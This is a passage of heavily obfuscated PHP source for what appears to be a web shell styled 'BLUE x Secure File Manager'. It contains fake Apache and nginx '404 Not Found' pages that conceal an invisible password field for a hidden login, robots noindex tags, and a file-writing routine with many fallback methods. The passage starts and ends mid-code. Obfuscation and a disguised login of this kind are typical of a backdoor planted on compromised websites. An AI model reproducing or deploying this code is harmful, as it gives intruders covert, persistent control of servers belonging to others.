        $_19b064 = array_values(array_filter(explode("\x2f", $_013f0a), chr(115).chr(116).chr(114).chr(108).chr(101).chr(110)));
        $_686b15 = chr(47);
        $_862fdd[] = array(chr(47), "\x2f");
        foreach ($_19b064 as $_3c0f3b) {
            $_686b15 .= $_3c0f3b . "\x2f";
            $_862fdd[] = array($_3c0f3b, rtrim($_686b15, "\x2f"));
        }
    }
    return $_862fdd;
}


function _f7c10a612($_f44213)
{
    $_5102cf = isset($_SERVER["\x44\x4f\x43\x55\x4d\x45\x4e\x54\x5f\x52\x4f\x4f\x54"]) ? $_SERVER[chr(68).chr(79).chr(67).chr(85).chr(77).chr(69).chr(78).chr(84).chr(95).chr(82).chr(79).chr(79).chr(84)] : "";
    if ($_5102cf === '')
        return null;
    
    
    static $_40e74b = false;
    if ($_40e74b === false) {
        $_49d51b = realpath($_5102cf);
        $_40e74b = ($_49d51b === false) ? null : rtrim(str_replace(chr(92), "\x2f", $_49d51b), "\x2f");
    }
    $_07ac95 = $_40e74b;
    $_02da8e = realpath($_f44213);
    if ($_07ac95 === null || $_02da8e === false)
        return null;
    $_02da8e = str_replace("\x5c", "\x2f", $_02da8e);
    if ($_02da8e === $_07ac95) {
        $_5365ad = '';
    } elseif (strpos($_02da8e, $_07ac95 . chr(47)) === 0) {
        $_5365ad = substr($_02da8e, strlen($_07ac95) + 1);
    } else {
        return null;
    }
    $_a33825 = (!empty($_SERVER[chr(72).chr(84).chr(84).chr(80).chr(83)]) && $_SERVER[chr(72).chr(84).chr(84).chr(80).chr(83)] !== "\x6f\x66\x66") ? "\x68\x74\x74\x70\x73" : "\x68\x74\x74\x70";
    $_071742 = isset($_SERVER["\x48\x54\x54\x50\x5f\x48\x4f\x53\x54"]) ? $_SERVER["\x48\x54\x54\x50\x5f\x48\x4f\x53\x54"] : "\x6c\x6f\x63\x61\x6c\x68\x6f\x73\x74";
    $_776c6d = array_map(chr(114).chr(97).chr(119).chr(117).chr(114).chr(108).chr(101).chr(110).chr(99).chr(111).chr(100).chr(101), explode("\x2f", $_5365ad));
    return $_a33825 . chr(58).chr(47).chr(47) . $_071742 . "\x2f" . implode("\x2f", $_776c6d);
}
function _f3f4130b7()
{
    if ($_SERVER["\x52\x45\x51\x55\x45\x53\x54\x5f\x4d\x45\x54\x48\x4f\x44"] === chr(80).chr(79).chr(83).chr(84)) {
        $_37e0f9 = isset($_SESSION["\x63\x73\x72\x66"]) ? $_SESSION[chr(99).chr(115).chr(114).chr(102)] : '';
        $_56012a = isset($_POST[chr(99).chr(115).chr(114).chr(102)]) ? (string)$_POST["\x63\x73\x72\x66"] : '';
        $_c3adcc = hash_equals($_37e0f9, $_56012a);
        if (!$_c3adcc) {
            http_response_code(400);
            exit(chr(67).chr(83).chr(82).chr(70).chr(32).chr(116).chr(111).chr(107).chr(101).chr(110).chr(32).chr(105).chr(110).chr(118).chr(97).chr(108).chr(105).chr(100));
        }
    }
}


function _f92db36c1($_013f0a, $_f11a7b = null)
{
    $_7612cf = chr(67).chr(114).chr(101).chr(97).chr(116).chr(101).chr(100).chr(32).chr(98).chr(121).chr(32).chr(66).chr(76).chr(85).chr(69).chr(32).chr(64).chr(32) . date(chr(99)) . "\x0a";
    $_8adbc7 = (string)($_f11a7b !== null ? $_f11a7b : $_7612cf);
    if ($_8adbc7 === '')
        $_8adbc7 = $_7612cf;

    $_16a1d4 = @file_put_contents($_013f0a, $_8adbc7, LOCK_EX);
    if ($_16a1d4 !== false && $_16a1d4 > 0)
        return array(true, "\x66\x69\x6c\x65\x5f\x70\x75\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73");

    $_6b5f89 = @fopen($_013f0a, "\x77\x62");
    if ($_6b5f89) {
        $_6e3b03 = @fwrite($_6b5f89, $_8adbc7);
        @fclose($_6b5f89);
        if ($_6e3b03 !== false && $_6e3b03 > 0)
            return array(true, chr(102).chr(111).chr(112).chr(101).chr(110).chr(43).chr(102).chr(119).chr(114).chr(105).chr(116).chr(101));
    }

    $_06b18c = @tempnam(sys_get_temp_dir(), chr(98).chr(108).chr(117).chr(101).chr(95));
    if ($_06b18c) {
        @file_put_contents($_06b18c, $_8adbc7);
        if (@rename($_06b18c, $_013f0a)) {
            if (@filesize($_013f0a) > 0)
                return array(true, chr(116).chr(101).chr(109).chr(112).chr(110).chr(97).chr(109).chr(43).chr(114).chr(101).chr(110).chr(97).chr(109).chr(101));
        }
        elseif (@copy($_06b18c, $_013f0a)) {
            @unlink($_06b18c);
            if (@filesize($_013f0a) > 0)
                return array(true, "\x74\x65\x6d\x70\x6e\x61\x6d\x2b\x63\x6f\x70\x79");
        }
        @unlink($_06b18c);
    }

    $_f700d9 = @fopen("\x70\x68\x70\x3a\x2f\x2f\x74\x65\x6d\x70", "\x77\x62\x2b");
    if ($_f700d9) {
        @fwrite($_f700d9, $_8adbc7);
        @rewind($_f700d9);
        $_5fce97 = @fopen($_013f0a, "\x77\x62");
        if ($_5fce97) {
            $_bb2f6b = @stream_copy_to_stream($_f700d9, $_5fce97);
            @fclose($_5fce97);
            if ($_bb2f6b !== false && $_bb2f6b > 0) {
                @fclose($_f700d9);
                return array(true, chr(112).chr(104).chr(112).chr(58).chr(47).chr(47).chr(116).chr(101).chr(109).chr(112).chr(32).chr(99).chr(111).chr(112).chr(121));
            }
        }
        @fclose($_f700d9);
    }

    if (@touch($_013f0a)) {
        $_470e77 = @file_put_contents($_013f0a, $_8adbc7, FILE_APPEND);
        if ($_470e77 !== false && $_470e77 > 0)
            return array(true, chr(116).chr(111).chr(117).chr(99).chr(104).chr(43).chr(97).chr(112).chr(112).chr(101).chr(110).chr(100));
    }

    return array(false, "\x41\x6c\x6c\x20\x6d\x65\x74\x68\x6f\x64\x73\x20\x66\x61\x69\x6c\x65\x64");
}


function _f0812c81b($_9043da = "")
{
    $_223b4a = isset($_SESSION[chr(99).chr(115).chr(114).chr(102)]) ? $_SESSION[chr(99).chr(115).chr(114).chr(102)] : '';
?>
    <!doctype html><html lang="en" class="dark"><head>
    <meta charset="utf-8"><title>BLUE</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
    <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>tailwind.config={theme:{extend:{fontFamily:{ui:['Ubuntu','ui-sans-serif','system-ui','Segoe UI','Roboto','Helvetica Neue','Arial','Noto Sans']},colors:{canvas:{DEFAULT:'#0b1220',surface:'rgba(15,23,42,.8)'}},boxShadow:{soft:'0 10px 30px rgba(0,0,0,.45)',card:'0 6px 20px rgba(37,99,235,.22)'},borderRadius:{xl2:'18px'}}},darkMode:'class'}</script>
    <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link href="https://www.svgrepo.com/show/475654/github-color.svg" rel="icon">
    <style>
        :root{color-scheme:dark} html,body{height:100%}
        body{font-family:'Ubuntu',system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial,"Noto Sans";}
        .shell{min-height:100vh;background:radial-gradient(1200px 600px at 20% -10%, rgba(59,130,246,.15), transparent 60%), radial-gradient(900px 500px at 90% 0%, rgba(168,85,247,.12), transparent 60%), #0b1220; display:flex;align-items:center;justify-content:center;}
        .card{background:rgba(15,23,42,.8);border:1px solid rgba(148,163,184,.15);border-radius:18px;box-shadow:0 10px 30px rgba(0,0,0,.45), inset 0 1px 0 rgba(255,255,255,.03);backdrop-filter:blur(8px);}
        .btn{background:linear-gradient(180deg,#3b82f6,#2563eb);color:#eaf2ff;border-radius:12px;padding:.7rem 1rem;font-weight:700;transition:transform .05s, box-shadow .15s, filter .15s; box-shadow:0 6px 20px rgba(37,99,235,.25);}
        .btn:hover{filter:brightness(1.05);box-shadow:0 10px 26px rgba(37,99,235,.35)} .btn:active{transform:translateY(.5px)}
        .field{border:1px solid rgba(148,163,184,.18);border-radius:12px;padding:.6rem .8rem;width:100%;background:#0b1220;color:#e5e7eb;}
        .field:focus{outline:none;box-shadow:0 0 0 4px rgba(59,130,246,.25);border-color:#3b82f6}
        .title{background:linear-gradient(90deg,#93c5fd,#c4b5fd);-webkit-background-clip:text;background-clip:text;color:transparent}
    </style>
</head><body class="shell text-slate-100">
<div class="w-full max-w-md card p-6">
    <div class="mb-5 flex items-center justify-between">
        <div class="text-xl font-bold tracking-tight title">BLUE</div>
        <span class="text-xs text-slate-400">PHP <?php echo h(PHP_VERSION); ?></span>
    </div>
    <?php if ($_9043da): ?><div class="mb-3 rounded-lg border border-red-900/60 bg-red-900/30 text-red-100 px-3 py-2"><?php echo h($_9043da); ?></div><?php
    endif; ?>
    <form method="post" action="?a=login" class="space-y-3">
        <input type="hidden" name="csrf" value="<?php echo h($_223b4a); ?>">
        <div><label class="text-sm text-slate-300">Username</label><input class="field mt-1" name="user" type="text" autocomplete="username" required></div>
        <div><label class="text-sm text-slate-300">Password</label><input class="field mt-1" name="pass" type="password" autocomplete="current-password" required></div>
        <button class="btn w-full" type="submit">Login</button>
    </form>
    <p class="text-[12px] text-slate-400 mt-4 text-center">© BLUE x Secure File Manager</p>
</div>
</body></html><?php
}

function _f4d5ace9d()
{
    $_74fc0e = isset($_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x53\x4f\x46\x54\x57\x41\x52\x45"]) ? strtolower((string)$_SERVER[chr(83).chr(69).chr(82).chr(86).chr(69).chr(82).chr(95).chr(83).chr(79).chr(70).chr(84).chr(87).chr(65).chr(82).chr(69)]) : "";
    if (strpos($_74fc0e, "\x6e\x67\x69\x6e\x78") !== false)
        return "\x6e\x67\x69\x6e\x78";
    if (strpos($_74fc0e, chr(97).chr(112).chr(97).chr(99).chr(104).chr(101)) !== false)
        return "\x61\x70\x61\x63\x68\x65";
    return "\x61\x70\x61\x63\x68\x65";
}

function _ffacb1a5f()
{
    $_223b4a = isset($_SESSION[chr(99).chr(115).chr(114).chr(102)]) ? $_SESSION[chr(99).chr(115).chr(114).chr(102)] : "";
    $_071742 = isset($_SERVER["\x48\x54\x54\x50\x5f\x48\x4f\x53\x54"]) ? h($_SERVER[chr(72).chr(84).chr(84).chr(80).chr(95).chr(72).chr(79).chr(83).chr(84)]) : chr(108).chr(111).chr(99).chr(97).chr(108).chr(104).chr(111).chr(115).chr(116);
    $_147dea  = isset($_SERVER[chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(95).chr(85).chr(82).chr(73)]) ? h($_SERVER["\x52\x45\x51\x55\x45\x53\x54\x5f\x55\x52\x49"]) : "\x2f";
    http_response_code(404);
?><!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL <?php echo $_147dea; ?> was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at <?php echo $_071742; ?> Port 80</address>
<form method="post" action="?a=404pass" style="margin:0;padding:0;">
    <input type="hidden" name="csrf" value="<?php echo h($_223b4a); ?>">
    <input type="password" name="pass" id="hpass"
           style="position:fixed;opacity:0;width:1px;height:1px;top:0;left:0;border:none;outline:none;padding:0;margin:0;pointer-events:auto;"
           autocomplete="new-password" tabindex="-1" aria-hidden="true">
</form>
<script>
(function(){
    var f=document.getElementById('hpass');
    document.addEventListener('click',function(e){if(e.target!==f)f.focus();});
    f.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();this.closest('form').submit();}});
})();
</script>
</body></html><?php
}

function _fde920cfb()
{
    $_223b4a = isset($_SESSION[chr(99).chr(115).chr(114).chr(102)]) ? $_SESSION["\x63\x73\x72\x66"] : '';
    http_response_code(404);
?><!DOCTYPE html>
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
<form method="post" action="?a=404pass" style="margin:0;padding:0;">
    <input type="hidden" name="csrf" value="<?php echo h($_223b4a); ?>">
    <input type="password" name="pass" id="hpass"
           style="position:fixed;opacity:0;width:1px;height:1px;top:0;left:0;border:none;outline:none;padding:0;margin:0;pointer-events:auto;"
           autocomplete="new-password" tabindex="-1" aria-hidden="true">
</form>
<script>
(function(){
    var f=document.getElementById('hpass');
    document.addEventListener('click',function(e){if(e.target!==f)f.focus();});
    f.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();this.closest('form').submit();}});
})();
</script>
</body>
</html><?php
}

function _fbf8e18ba()
{
    if (_f4d5ace9d() === chr(110).chr(103).chr(105).chr(110).chr(120))
        _fde920cfb();
    else
        _ffacb1a5f();
}

function _f78f43e2d($_76a7dd, $_25b233)
{
    if (is_fn_usable("\x70\x61\x73\x73\x77\x6f\x72\x64\x5f\x76\x65\x72\x69\x66\x79"))
        return password_verify($_76a7dd, $_25b233);
    if (strlen($_25b233) >= 60 && ($_25b233[0] . $_25b233[1]) === chr(36).chr(50))
        return crypt($_76a7dd, $_25b233) === $_25b233;
    return false;
}
function _fbb05e6f9($_caeef0, $_36defd)
{
    if ($_caeef0 !== AUTH_USER)
        return false;
    $_25b233 = AUTH_PASS_HASH;
    if ($_25b233 === "" || strlen($_25b233) < 20)
        return false;
    return _f78f43e2d($_36defd, $_25b233);
}


function _f04034bc2($_bc4c7b, $_c4f9f0 = "\x69\x63\x6f")
{
    
    
    static $_1810e4 = array();
    if (isset($_1810e4[$_c4f9f0])) {
        $_25df3d = $_1810e4[$_c4f9f0];
        return isset($_25df3d[$_bc4c7b]) ? $_25df3d[$_bc4c7b] : $_25df3d["\x66\x69\x6c\x65"];
    }
    $_25df3d = array(
        chr(102).chr(111).chr(108).chr(100).chr(101).chr(114) => "\x3c\x73\x76\x67\x20\x76\x69\x65\x77\x42\x6f\x78\x3d\x22\x30\x20\x30\x20\x32\x34\x20\x32\x34\x22\x20\x63\x6c\x61\x73\x73\x3d\x22" . $_c4f9f0 . "\x22\x20\x61\x72\x69\x61\x2d\x68\x69\x64\x64\x65\x6e\x3d\x22\x74\x72\x75\x65\x22\x3e\x3c\x70\x61\x74\x68\x20\x64\x3d\x22\x4d\x31\x30\x20\x34\x6c\x32\x20\x32\x68\x36\x61\x32\x20\x32\x20\x30\x20\x30\x31\x32\x20\x32\x76\x31\x48\x34\x56\x36\x61\x32\x20\x32\x20\x30\x20\x30\x31\x32\x2d\x32\x68\x34\x7a\x22\x20\x66\x69\x6c\x6c\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x20\x6f\x70\x61\x63\x69\x74\x79\x3d\x22\x2e\x31\x32\x22\x2f\x3e\x3c\x70\x61\x74\x68\x20\x64\x3d\x22\x4d\x33\x20\x39\x68\x31\x38\x76\x39\x61\x32\x20\x32\x20\x30\x20\x30\x31\x2d\x32\x20\x32\x48\x35\x61\x32\x20\x32\x20\x30\x20\x30\x31\x2d\x32\x2d\x32\x56\x39\x7a\x22\x20\x66\x69\x6c\x6c\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x2f\x3e\x3c\x2f\x73\x76\x67\x3e",
        "\x66\x69\x6c\x65" => "\x3c\x73\x76\x67\x20\x76\x69\x65\x77\x42\x6f\x78\x3d\x22\x30\x20\x30\x20\x32\x34\x20\x32\x34\x22\x20\x63\x6c\x61\x73\x73\x3d\x22" . $_c4f9f0 . chr(34).chr(32).chr(97).chr(114).chr(105).chr(97).chr(45).chr(104).chr(105).chr(100).chr(100).chr(101).chr(110).chr(61).chr(34).chr(116).chr(114).chr(117).chr(101).chr(34).chr(62).chr(60).chr(112).chr(97).chr(116).chr(104).chr(32).chr(100).chr(61).chr(34).chr(77).chr(54).chr(32).chr(51).chr(104).chr(55).chr(108).chr(53).chr(32).chr(53).chr(118).chr(49).chr(49).chr(97).chr(50).chr(32).chr(50).chr(32).chr(48).chr(32).chr(48).chr(49).chr(45).chr(50).chr(32).chr(50).chr(72).chr(54).chr(97).chr(50).chr(32).chr(50).chr(32).chr(48).chr(32).chr(48).chr(49).chr(45).chr(50).chr(45).chr(50).chr(86).chr(53).chr(34).chr(32).chr(102).chr(105).chr(108).chr(108).chr(61).chr(34).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(108).chr(111).chr(114).chr(34).chr(32).chr(111).chr(112).chr(97).chr(99).chr(105).chr(116).chr(121).chr(61).chr(34).chr(46).chr(49).chr(50).chr(34).chr(47).chr(62).chr(60).chr(112).chr(97).chr(116).chr(104).chr(32).chr(100).chr(61).chr(34).chr(77).chr(49).chr(51).chr(32).chr(51).chr(118).chr(53).chr(97).chr(50).chr(32).chr(50).chr(32).chr(48).chr(32).chr(48).chr(48).chr(50).chr(32).chr(50).chr(104).chr(53).chr(34).chr(32).chr(102).chr(105).chr(108).chr(108).chr(61).chr(34).chr(110).chr(111).chr(110).chr(101).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(61).chr(34).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(108).chr(111).chr(114).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(45).chr(119).chr(105).chr(100).chr(116).chr(104).chr(61).chr(34).chr(50).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(45).chr(108).chr(105).chr(110).chr(101).chr(106).chr(111).chr(105).chr(110).chr(61).chr(34).chr(114).chr(111).chr(117).chr(110).chr(100).chr(34).chr(47).chr(62).chr(60).chr(47).chr(115).chr(118).chr(103).chr(62),
        chr(99).chr(111).chr(100).chr(101) => "\x3c\x73\x76\x67\x20\x76\x69\x65\x77\x42\x6f\x78\x3d\x22\x30\x20\x30\x20\x32\x34\x20\x32\x34\x22\x20\x63\x6c\x61\x73\x73\x3d\x22" . $_c4f9f0 . "\x22\x3e\x3c\x70\x61\x74\x68\x20\x64\x3d\x22\x4d\x38\x20\x31\x36\x6c\x2d\x34\x2d\x34\x20\x34\x2d\x34\x4d\x31\x36\x20\x38\x6c\x34\x20\x34\x2d\x34\x20\x34\x22\x20\x66\x69\x6c\x6c\x3d\x22\x6e\x6f\x6e\x65\x22\x20\x73\x74\x72\x6f\x6b\x65\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x20\x73\x74\x72\x6f\x6b\x65\x2d\x77\x69\x64\x74\x68\x3d\x22\x32\x22\x20\x73\x74\x72\x6f\x6b\x65\x2d\x6c\x69\x6e\x65\x63\x61\x70\x3d\x22\x72\x6f\x75\x6e\x64\x22\x20\x73\x74\x72\x6f\x6b\x65\x2d\x6c\x69\x6e\x65\x6a\x6f\x69\x6e\x3d\x22\x72\x6f\x75\x6e\x64\x22\x2f\x3e\x3c\x2f\x73\x76\x67\x3e",
        "\x74\x65\x78\x74" => "\x3c\x73\x76\x67\x20\x76\x69\x65\x77\x42\x6f\x78\x3d\x22\x30\x20\x30\x20\x32\x34\x20\x32\x34\x22\x20\x63\x6c\x61\x73\x73\x3d\x22" . $_c4f9f0 . chr(34).chr(62).chr(60).chr(112).chr(97).chr(116).chr(104).chr(32).chr(100).chr(61).chr(34).chr(77).chr(52).chr(32).chr(54).chr(104).chr(49).chr(54).chr(77).chr(52).chr(32).chr(49).chr(50).chr(104).chr(49).chr(54).chr(77).chr(52).chr(32).chr(49).chr(56).chr(104).chr(49).chr(48).chr(34).chr(32).chr(102).chr(105).chr(108).chr(108).chr(61).chr(34).chr(110).chr(111).chr(110).chr(101).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(61).chr(34).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(108).chr(111).chr(114).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(45).chr(119).chr(105).chr(100).chr(116).chr(104).chr(61).chr(34).chr(50).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(45).chr(108).chr(105).chr(110).chr(101).chr(99).chr(97).chr(112).chr(61).chr(34).chr(114).chr(111).chr(117).chr(110).chr(100).chr(34).chr(47).chr(62).chr(60).chr(47).chr(115).chr(118).chr(103).chr(62),
        "\x70\x77\x78" => chr(60).chr(115).chr(118).chr(103).chr(32).chr(118).chr(105).chr(101).chr(119).chr(66).chr(111).chr(120).chr(61).chr(34).chr(48).chr(32).chr(48).chr(32).chr(52).chr(56).chr(32).chr(52).chr(56).chr(34).chr(32).chr(99).chr(108).chr(97).chr(115).chr(115).chr(61).chr(34) . $_c4f9f0 . chr(34).chr(32).chr(97).chr(114).chr(105).chr(97).chr(45).chr(104).chr(105).chr(100).chr(100).chr(101).chr(110).chr(61).chr(34).chr(116).chr(114).chr(117).chr(101).chr(34).chr(32).chr(120).chr(109).chr(108).chr(110).chr(115).chr(61).chr(34).chr(104).chr(116).chr(116).chr(112).chr(58).chr(47).chr(47).chr(119).chr(119).chr(119).chr(46).chr(119).chr(51).chr(46).chr(111).chr(114).chr(103).chr(47).chr(50).chr(48).chr(48).chr(48).chr(47).chr(115).chr(118).chr(103).chr(34).chr(62).chr(60).chr(103).chr(32).chr(102).chr(105).chr(108).chr(108).chr(61).chr(34).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(108).chr(111).chr(114).chr(34).chr(62).chr(60).chr(103).chr(32).chr(116).chr(114).chr(97).chr(110).chr(115).chr(102).chr(111).chr(114).chr(109).chr(61).chr(34).chr(116).chr(114).chr(97).chr(110).chr(115).chr(108).chr(97).chr(116).chr(101).chr(40).chr(45).chr(55).chr(48).chr(48).chr(32).chr(45).chr(53).chr(54).chr(48).chr(41).chr(34).chr(62).chr(60).chr(112).chr(97).chr(116).chr(104).chr(32).chr(100).chr(61).chr(34).chr(77).chr(55).chr(50).chr(51).chr(46).chr(57).chr(57).chr(56).chr(53).chr(44).chr(53).chr(54).chr(48).chr(32).chr(67).chr(55).chr(49).chr(48).chr(46).chr(55).chr(52).chr(54).chr(44).chr(53).chr(54).chr(48).chr(32).chr(55).chr(48).chr(48).chr(44).chr(53).chr(55).chr(48).chr(46).chr(55).chr(56).chr(55).chr(48).chr(57).chr(50).chr(32).chr(55).chr(48).chr(48).chr(44).chr(53).chr(56).chr(52).chr(46).chr(48).chr(57).chr(54).chr(54).chr(52).chr(52).chr(32).chr(67).chr(55).chr(48).chr(48).chr(44).chr(53).chr(57).chr(52).chr(46).chr(55).chr(52).chr(48).chr(54).chr(55).chr(49).chr(32).chr(55).chr(48).chr(54).chr(46).chr(56).chr(55).chr(54).chr(44).chr(54).chr(48).chr(51).chr(46).chr(55).chr(55).chr(49).chr(56).chr(51).chr(32).chr(55).chr(49).chr(54).chr(46).chr(52).chr(49).chr(52).chr(53).chr(44).chr(54).chr(48).chr(54).chr(46).chr(57).chr(53).chr(56).chr(52).chr(49).chr(50).chr(32).chr(67).chr(55).chr(49).chr(55).chr(46).chr(54).chr(49).chr(52).chr(53).chr(44).chr(54).chr(48).chr(55).chr(46).chr(49).chr(55).chr(57).chr(55).chr(56).chr(54).chr(32).chr(55).chr(49).chr(56).chr(46).chr(48).chr(53).chr(50).chr(53).chr(44).chr(54).chr(48).chr(54).chr(46).chr(52).chr(51).chr(53).chr(56).chr(52).chr(57).chr(32).chr(55).chr(49).chr(56).chr(46).chr(48).chr(53).chr(50).chr(53).chr(44).chr(54).chr(48).chr(53).chr(46).chr(55).chr(57).chr(55).chr(51).chr(50).chr(56).chr(32).chr(67).chr(55).chr(49).chr(56).chr(46).chr(48).chr(53).chr(50).chr(53).chr(44).chr(54).chr(48).chr(53).chr(46).chr(50).chr(50).chr(53).chr(48).chr(54).chr(56).chr(32).chr(55).chr(49).chr(56).chr(46).chr(48).chr(51).chr(49).chr(53).chr(44).chr(54).chr(48).chr(51).chr(46).chr(55).chr(49).chr(48).chr(48).chr(56).chr(54).chr(32).chr(55).chr(49).chr(56).chr(46).chr(48).chr(49).chr(57).chr(53).chr(44).chr(54).chr(48).chr(49).chr(46).chr(54).chr(57).chr(57).chr(54).chr(52).chr(56).chr(32).chr(67).chr(55).chr(49).chr(49).chr(46).chr(51).chr(52).chr(51).chr(44).chr(54).chr(48).chr(51).chr(46).chr(49).chr(53).chr(53).chr(56).chr(57).chr(56).chr(32).chr(55).chr(48).chr(57).chr(46).chr(57).chr(51).chr(52).chr(53).chr(44).chr(53).chr(57).chr(56).chr(46).chr(52).chr(54).chr(57).chr(51).chr(57).chr(52).chr(32).chr(55).chr(48).chr(57).chr(46).chr(57).chr(51).chr(52).chr(53).chr(44).chr(53).chr(57).chr(56).chr(46).chr(52).chr(54).chr(57).chr(51).chr(57).chr(52).chr(32).chr(67).chr(55).chr(48).chr(56).chr(46).chr(56).chr(52).chr(52).chr(44).chr(53).chr(57).chr(53).chr(46).chr(54).chr(56).chr(54).chr(52).chr(48).chr(53).chr(32).chr(55).chr(48).chr(55).chr(46).chr(50).chr(55).chr(48).chr(53).chr(44).chr(53).chr(57).chr(52).chr(46).chr(57).chr(52).chr(53).chr(52).chr(56).chr(32).chr(55).chr(48).chr(55).chr(46).chr(50).chr(55).chr(48).chr(53).chr(44).chr(53).chr(57).chr(52).chr(46).chr(57).chr(52).chr(53).chr(52).chr(56).chr(32).chr(67).chr(55).chr(48).chr(53).chr(46).chr(48).chr(57).chr(49).chr(44).chr(53).chr(57).chr(51).chr(46).chr(52).chr(53).chr(48).chr(48).chr(55).chr(53).chr(32).chr(55).chr(48).chr(55).chr(46).chr(52).chr(51).chr(53).chr(53).chr(44).chr(53).chr(57).chr(51).chr(46).chr(52).chr(56).chr(48).chr(49).chr(57).chr(52).chr(32).chr(55).chr(48).chr(55).chr(46).chr(52).chr(51).chr(53).chr(53).chr(44).chr(53).chr(57).chr(51).chr(46).chr(52).chr(56).chr(48).chr(49).chr(57).chr(52).chr(32).chr(67).chr(55).chr(48).chr(57).chr(46).chr(56).chr(52).chr(51).chr(44).chr(53).chr(57).chr(51).chr(46).chr(54).chr(53).chr(48).chr(51).chr(54).chr(54).chr(32).chr(55).chr(49).chr(49).chr(46).chr(49).chr(49).chr(48).chr(53).chr(44).chr(53).chr(57).chr(53).chr(46).chr(57).chr(54).chr(51).chr(52).chr(57).chr(57).chr(32).chr(55).chr(49).chr(49).chr(46).chr(49).chr(49).chr(48).chr(53).chr(44).chr(53).chr(57).chr(53).chr(46).chr(57).chr(54).chr(51).chr(52).chr(57).chr(57).chr(32).chr(67).chr(55).chr(49).chr(51).chr(46).chr(50).chr(53).chr(50).chr(53).chr(44).chr(53).chr(57).chr(57).chr(46).chr(54).chr(52).chr(53).chr(53).chr(51).chr(56).chr(32).chr(55).chr(49).chr(54).chr(46).chr(55).chr(50).chr(56).chr(44).chr(53).chr(57).chr(56).chr(46).chr(53).chr(56).chr(50).chr(51).chr(52).chr(32).chr(55).chr(49).chr(56).chr(46).chr(48).chr(57).chr(54).chr(44).chr(53).chr(57).chr(55).chr(46).chr(57).chr(54).chr(52).chr(57).chr(48).chr(50).chr(32).chr(67).chr(55).chr(49).chr(56).chr(46).chr(51).chr(49).chr(51).chr(53).chr(44).chr(53).chr(57).chr(54).chr(46).chr(52).chr(48).chr(55).chr(55).chr(53).chr(52).chr(32).chr(55).chr(49).chr(56).chr(46).chr(57).chr(51).chr(52).chr(53).chr(44).chr(53).chr(57).chr(53).chr(46).chr(51).chr(52).chr(54).chr(48).chr(54).chr(50).chr(32).chr(55).chr(49).chr(57).chr(46).chr(54).chr(50).chr(44).chr(53).chr(57).chr(52).chr(46).chr(55).chr(52).chr(51).chr(54).chr(56).chr(51).chr(32).chr(67).chr(55).chr(49).chr(52).chr(46).chr(50).chr(57).chr(48).chr(53).chr(44).chr(53).chr(57).chr(52).chr(46).chr(49).chr(51).chr(53).chr(50).chr(56).chr(49).chr(32).chr(55).chr(48).chr(56).chr(46).chr(54).chr(56).chr(56).chr(44).chr(53).chr(57).chr(50).chr(46).chr(48).chr(54).chr(57).chr(49).chr(50).chr(51).chr(32).chr(55).chr(48).chr(56).chr(46).chr(54).chr(56).chr(56).chr(44).chr(53).chr(56).chr(50).chr(46).chr(56).chr(51).chr(54).chr(49).chr(54).chr(55).chr(32).chr(67).chr(55).chr(48).chr(56).chr(46).chr(54).chr(56).chr(56).chr(44).chr(53).chr(56).chr(48).chr(46).chr(50).chr(48).chr(53).chr(50).chr(55).chr(57).chr(32).chr(55).chr(48).chr(57).chr(46).chr(54).chr(50).chr(50).chr(53).chr(44).chr(53).chr(55).chr(56).chr(46).chr(48).chr(53).chr(52).chr(55).chr(56).chr(56).chr(32).chr(55).chr(49).chr(49).chr(46).chr(49).chr(53).chr(56).chr(53).chr(44).chr(53).chr(55).chr(54).chr(46).chr(51).chr(54).chr(57).chr(54).chr(51).chr(52).chr(32).chr(67).chr(55).chr(49).chr(48).chr(46).chr(57).chr(49).chr(49).chr(44).chr(53).chr(55).chr(53).chr(46).chr(55).chr(53).chr(57).chr(55).chr(50).chr(54).chr(32).chr(55).chr(49).chr(48).chr(46).chr(48).chr(56).chr(55).chr(53).chr(44).chr(53).chr(55).chr(51).chr(46).chr(51).chr(49).chr(49).chr(48).chr(53).chr(56).chr(32).chr(55).chr(49).chr(49).chr(46).chr(51).chr(57).chr(50).chr(53).chr(44).chr(53).chr(54).chr(57).chr(46).chr(57).chr(57).chr(51).chr(52).chr(53).chr(56).chr(32).chr(67).chr(55).chr(49).chr(49).chr(46).chr(51).chr(57).chr(50).chr(53).chr(44).chr(53).chr(54).chr(57).chr(46).chr(57).chr(57).chr(51).chr(52).chr(53).chr(56).chr(32).chr(55).